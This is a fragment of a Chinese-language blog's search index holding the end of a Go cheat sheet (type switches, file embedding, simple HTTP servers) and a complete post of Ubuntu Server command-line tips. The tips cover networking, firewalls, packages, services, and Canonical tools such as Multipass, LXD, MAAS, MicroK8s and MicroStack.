class="string"> &quot;Hello&quot; in Hindi is नमस्ते (&#x27;Namaste&#x27;)</span></span><br><span class="line"><span class="string">`</span> <span class="comment">// multi-line string literal, using back-tick at beginning and end</span></span><br></pre></td></tr></table></figure>

<h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><h4 id="类型切换"><a href="#类型切换" class="headerlink" title="类型切换"></a>类型切换</h4><p>类型切换类似于常规的switch语句，但类型切换中的情况指定要与给定接口值持有的值的类型进行比较的类型，而不是值。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">do</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">	<span class="keyword">switch</span> v := i.(<span class="keyword">type</span>) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">		fmt.Printf(<span class="string">&quot;Twice %v is %v\n&quot;</span>, v, v*<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">		fmt.Printf(<span class="string">&quot;%q is %v bytes long\n&quot;</span>, v, <span class="built_in">len</span>(v))</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		fmt.Printf(<span class="string">&quot;I don&#x27;t know about type %T!\n&quot;</span>, v)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	do(<span class="number">21</span>)</span><br><span class="line">	do(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">	do(<span class="literal">true</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="片段"><a href="#片段" class="headerlink" title="片段"></a>片段</h1><h3 id="文件嵌入"><a href="#文件嵌入" class="headerlink" title="文件嵌入"></a>文件嵌入</h3><p>Go程序可以使用<code>&quot;embed&quot;</code>包嵌入静态文件，如下所示：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;embed&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// content holds the static content (2 files) for the web server.</span></span><br><span class="line"><span class="comment">//go:embed a.txt b.txt</span></span><br><span class="line"><span class="keyword">var</span> content embed.FS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.Handle(<span class="string">&quot;/&quot;</span>, http.FileServer(http.FS(content)))</span><br><span class="line">	log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cHM6Ly9wbGF5LmdvbGFuZy5vcmcvcC9wd1d4ZHJRU3JZdg==">完整的Playground示例<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="HTTP服务器"><a href="#HTTP服务器" class="headerlink" title="HTTP服务器"></a>HTTP服务器</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// define a type for the response</span></span><br><span class="line"><span class="keyword">type</span> Hello <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let that type implement the ServeHTTP method (defined in interface http.Handler)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h Hello)</span></span> ServeHTTP(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    fmt.Fprint(w, <span class="string">&quot;Hello!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> h Hello</span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;localhost:4000&quot;</span>, h)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Here&#x27;s the method signature of http.ServeHTTP:</span></span><br><span class="line"><span class="comment">// type Handler interface &#123;</span></span><br><span class="line"><span class="comment">//     ServeHTTP(w http.ResponseWriter, r *http.Request)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>CheatSheet</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu Server CLI专业提示</title>
    <url>/2023/10/ubuntu-server-cli/</url>
    <content><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>获取所有接口的IP地址<br><strong><code>networkctl status</code></strong><br>显示主机的所有IP地址<br><strong><code>hostname -I</code></strong><br>启用&#x2F;禁用接口<br><strong><code>ip link set &lt;interface&gt; up</code></strong><br><strong><code>ip link set &lt;interface&gt; down</code></strong><br>显示路线<br><strong><code>ip route</code></strong><br>将使用哪条路线到达主机<br><strong><code>ip route get &lt;IP&gt;</code></strong></p>
<span id="more"></span>

<h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><p>显示已登录的用户<br><strong><code>w</code></strong><br>获取用户密码到期日期<br><strong><code>chage -l &lt;user&gt;</code></strong><br>设置用户密码到期日期<br><strong><code>sudo chage &lt;user&gt;</code></strong><br>锁定用户账户<br><strong><code>sudo passwd -l &lt;user&gt;</code></strong><br>解锁用户密码<br><strong><code>sudo passwd -u &lt;user&gt;</code></strong><br>自动检测并禁止滥用IP地址<br><strong><code>sudo apt install fail2ban</code></strong><br>显示被禁止的IP地址<br><strong><code>sudo fail2ban-client status</code></strong><br><strong><code>sudo fail2ban-client status &lt;jail&gt;</code></strong><br>将使用哪条路线到达主机<br><strong><code>ip route get &lt;IP&gt;</code></strong><br>列出打开的端口和关联的进程<br><strong><code>sudo ss -tulpn</code></strong><br>管理防火墙规则<br>开启防火墙 <strong><code>sudo ufw enable</code></strong><br>列出规则  <strong><code>sudo ufw status</code></strong><br>允许端口 <strong><code>sudo ufw allow &lt;port&gt;</code></strong><br>拒绝端口 <strong><code>sudo ufw deny &lt;port&gt;</code></strong><br>通过SSH远程连接<br><strong><code>ssh &lt;user&gt;@&lt;host IP&gt;</code></strong></p>
<h2 id="Ubuntu服务"><a href="#Ubuntu服务" class="headerlink" title="Ubuntu服务"></a>Ubuntu服务</h2><p>启用Ubuntu服务。<br>访问 ubuntu.com&#x2F;advantage 获得最多3台机器的免费代币（如果你是ubuntu社区的官方成员，则为50台）。<br><strong><code>sudo ua attach &lt;token&gt;</code></strong><br>查看Ubuntu Advantage服务的可用性和权利<br><strong><code>sudo ua status</code></strong><br>启用或禁用服务<br><strong><code>sudo ua enable &lt;service&gt;</code></strong><br><strong><code>sudo ua disable &lt;service&gt;</code></strong><br>修复CVE&#x2F;USN<br><strong><code>sudo ua fix &lt;cve/usn&gt;</code></strong><br>查看软件包更新系统的可用性状态<br><strong><code>sudo ubuntu-security-status</code></strong><br>查看Livepatch已修补的CVE<br><strong><code>canonical-livepatch status --verbose</code></strong></p>
<h2 id="软件包"><a href="#软件包" class="headerlink" title="软件包"></a>软件包</h2><p>搜索程序包<br><strong><code>apt search &lt;string&gt;</code></strong><br><strong><code>snap find &lt;string&gt;</code></strong><br>列出可用的软件包版本<br><strong><code>apt-cache policy &lt;package&gt;</code></strong><br>列出可用更新<br><strong><code>apt list --upgradable</code></strong><br>应用所有可用的更新<br><strong><code>sudo apt update &amp;&amp; sudo apt upgrade</code></strong><br>从Ubuntu归档安装<br><strong><code>sudo apt install &lt;package&gt;</code></strong><br>从Snap Store安装<br><strong><code>sudo snap install &lt;package&gt;</code></strong><br>卸载软件<br><strong><code>sudo apt remove &lt;package&gt;</code></strong><br>删除程序包及其所有配置文件<br><strong><code>sudo apt purge &lt;package&gt;</code></strong><br>重新安装损坏的包装<br><strong><code>sudo apt install -f --reinstall &lt;package&gt;</code></strong></p>
<p>此软件包提供哪些文件？<br><strong><code>dpkg-query -L &lt;package&gt;</code></strong><br>哪个包提供了此文件？<br><strong><code>dpkg-query -S &lt;path&gt;</code></strong></p>
<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>列出具有权限和日期的文件<br><strong><code>ll</code></strong><br>常见文件操作<br>创建空文件 <strong><code>touch &lt;filename&gt;</code></strong><br>创建制定大小文件 <strong><code>fallocate -l &lt;size&gt; &lt;filename&gt;</code></strong><br>使用内容创建  <strong><code>echo &quot;&lt;content&gt;&quot; &gt; &lt;filename&gt;</code></strong><br>快速文件搜索<br><strong><code>locate &lt;filename&gt;</code></strong><br>在文件中搜索字符串<br><strong><code>grep &lt;string&gt; &lt;filename&gt;</code></strong><br>在目录中递归搜索字符串<br><strong><code>grep -Iris &lt;string&gt; &lt;directory&gt;</code></strong></p>
<h1 id="高级"><a href="#高级" class="headerlink" title="高级"></a>高级</h1><h2 id="文件-1"><a href="#文件-1" class="headerlink" title="文件"></a>文件</h2><p>查找最近<n>分钟内修改的文件<br><strong><code>find &lt;directory&gt; -mmin -&lt;n&gt; -type f</code></strong><br><strong><code>eg. find . -mmin -5 -type f</code></strong><br>仅显示第n列<br><strong><code>col&lt;n&gt; “&lt;separator&gt;” &lt;filename&gt;</code></strong><br><strong><code>eg. col2 “,” foo.csv</code></strong><br>显示分页的文件<br><strong><code>less &lt;filename&gt;</code></strong><br>显示前<n>行<br><strong><code>head -n &lt;n&gt; &lt;filename&gt;</code></strong><br>显示最后<n>行<br><strong><code>tail -n &lt;n&gt; &lt;filename&gt;</code></strong><br>随着文件内容的增加而显示<br><strong><code>tail -f &lt;filename&gt;</code></strong><br>将目录打包到存档中<br>tar.gz <strong><code>tar cvzf &lt;target&gt;.tar.gz &lt;source dir&gt;</code></strong><br>zip <strong><code>zip -r &lt;target&gt; &lt;source dir&gt;</code></strong><br>打开归档文件的包装<br>tar.gz <strong><code>tar xf &lt;tar.gz file&gt;</code></strong><br>zip <strong><code>unzip &lt;zip file&gt;</code></strong><br>将文件复制到远程服务器<br><strong><code>rsync &lt;filename&gt; &lt;user@server&gt;:&lt;destination&gt;</code></strong><br><strong><code>eg. rsync config.yaml admin@192.0.0.0:/config</code></strong></p>
<p>从远程服务器递归复制目录<br><strong><code>rsync -avruz &lt;user@server&gt;:&lt;source&gt; &lt;destination&gt;</code></strong><br><strong><code>eg. rsync -avruz admin@192.0.0.0:/config /tmp</code></strong></p>
<h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><p>显示内核版本 <strong><code>uname -r</code></strong><br>获取根磁盘使用情况 <strong><code>df -h</code></strong><br>获取内存使用情况 <strong><code>cat /proc/meminfo</code></strong><br>获取系统时间 <strong><code>timedatectl status</code></strong><br>设置系统时区<br><strong><code>timedatectl list-timezones</code></strong><br><strong><code>sudo timedatectl set-timezone &lt;zone&gt;</code></strong><br>获取所有正在运行&#x2F;失败的服务<br><strong><code>systemctl --state running</code></strong><br><strong><code>systemctl --state failed</code></strong><br>启动、停止或重新启动服务<br><strong><code>systemctl start/stop/restart &lt;service&gt;</code></strong><br>获取系统服务的全部内容<br><strong><code>systemctl cat &lt;service&gt;</code></strong><br>编辑系统服务避免与程序包更新发生冲突<br><strong><code>systemctl edit &lt;service&gt;</code></strong><br>监视服务的新日志<br><strong><code>journalctl -u &lt;service&gt; --since now -f</code></strong><br>自启动以来监视所有日志 <strong><code>journalctl --boot 0</code></strong><br>获取最近登录的列表 <strong><code>last</code></strong><br>显示正在运行的进程 <strong><code>htop</code></strong><br>按id终止进程 <strong><code>kill &lt;process id&gt;</code></strong><br>按名称终止进程 <strong><code>pkill &lt;process name&gt;</code></strong><br>在后台运行命令 <strong><code>&lt;command&gt; &amp;</code></strong></p>
<p>挂断并登录到文件后仍然活着</p>
<p><strong><code>nohup &lt;command&gt; &gt;&gt; /var/log/yourcommand.log 2&gt;&amp;1 &amp;</code></strong><br>显示后台命令 <strong><code>jobs</code></strong><br>将命令 <n> 置于前台 <strong><code>fg &lt;n&gt;</code></strong></p>
<h2 id="工作站上的Ubuntu虚拟机"><a href="#工作站上的Ubuntu虚拟机" class="headerlink" title="工作站上的Ubuntu虚拟机"></a>工作站上的Ubuntu虚拟机</h2><p>安装Multipass并启动Ubuntu虚拟机<br><strong><code>sudo snap install multipass</code></strong><br><strong><code>multipass launch &lt;image&gt; --name &lt;VM name&gt;</code></strong><br>省略 <image> 将使用最新的Ubuntu LTS启动虚拟机<br>查找可用镜像<br><strong><code>multipass find</code></strong><br>列出现有虚拟机<br><strong><code>multipass list</code></strong><br>在虚拟机中获取外壳<br><strong><code>multipass shell &lt;VM name&gt;</code></strong><br>更多帮助在 discourse.ubuntu.com</p>
<h2 id="Micro-clouds"><a href="#Micro-clouds" class="headerlink" title="Micro clouds"></a>Micro clouds</h2><p>启动LXD容器<br><strong><code>lxd init</code></strong><br><strong><code>lxc launch ubuntu:18.04 &lt;container name&gt;</code></strong><br>或者另一个发行版<br><strong><code>lxc launch images:centos/8/amd64 &lt;container name&gt;</code></strong><br>将外壳放入LXD容器<br><strong><code>lxc exec &lt;name&gt; bash</code></strong><br>将文件推送到LXD容器<br><strong><code>lxc file push &lt;filename&gt; &lt;container name&gt;/&lt;path&gt;</code></strong><br>从LXD容器中提取文件<br><strong><code>lxc file pull &lt;destination&gt; &lt;container name&gt;/&lt;file path&gt;</code></strong><br>启动LXD虚拟机<br><strong><code>lxc launch images:ubuntu/20.04 &lt;vm name&gt; --vm</code></strong><br>在LXD虚拟机中获取外壳<br><strong><code>lxc exec &lt;name&gt; bash</code></strong><br>更多帮助在 linuxcontainers.org&#x2F;lxd</p>
<h2 id="裸机资源调配"><a href="#裸机资源调配" class="headerlink" title="裸机资源调配"></a>裸机资源调配</h2><p>使用MAAS演示启动虚拟机<br><strong><code>wget -qO- https://raw.githubusercontent.com/canonical/maas-multipass/main/maas.yml | multipass launch --name maas -c4 -m8GB -d32GB --cloud-init -</code></strong><br>查找MAAS演示服务器的IP地址<br><strong><code>multipass list | grep maas | awk &#39;&#123;print $3&#125;&#39;</code></strong><br>使用多路径列表中的IP访问MAAS仪表板<br><strong><code>http://10.x.x.x:5240/</code></strong><br><strong><code>Default username and password is admin:admin</code></strong><br>更多帮助在 maas.io</p>
<h2 id="Kubernetes"><a href="#Kubernetes" class="headerlink" title="Kubernetes"></a>Kubernetes</h2><p>安装MicroK8并列出可用的附加组件<br><strong><code>sudo snap install microk8s --classic</code></strong><br><strong><code>microk8s.status --wait-ready</code></strong><br>使用MicroK8s加载项启用辅助Kubernetes服务<br><strong><code>microk8s enable &lt;add-ons&gt;</code></strong><br>查看MicroK8s节点和正在运行的服务<br><strong><code>microk8s.kubectl get nodes</code></strong><br><strong><code>microk8s.kubectl get services</code></strong><br>更多帮助在 microk8s.io&#x2F;docs</p>
<h2 id="MicroStack"><a href="#MicroStack" class="headerlink" title="MicroStack"></a>MicroStack</h2><p>安装MicroStack并启动测试实例<br><strong><code>sudo snap install microstack --devmode --beta</code></strong><br><strong><code>sudo microstack.init --auto --control</code></strong><br><strong><code>microstack.launch cirros -n test</code></strong><br>获取管理员密码<br><strong><code>sudo snap get microstack config.credentials.keystone-password</code></strong><br>Access Horizon面板<br><strong><code>https://10.20.20.1</code></strong><br>更多帮助在 microstack.run&#x2F;docs</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
</search>
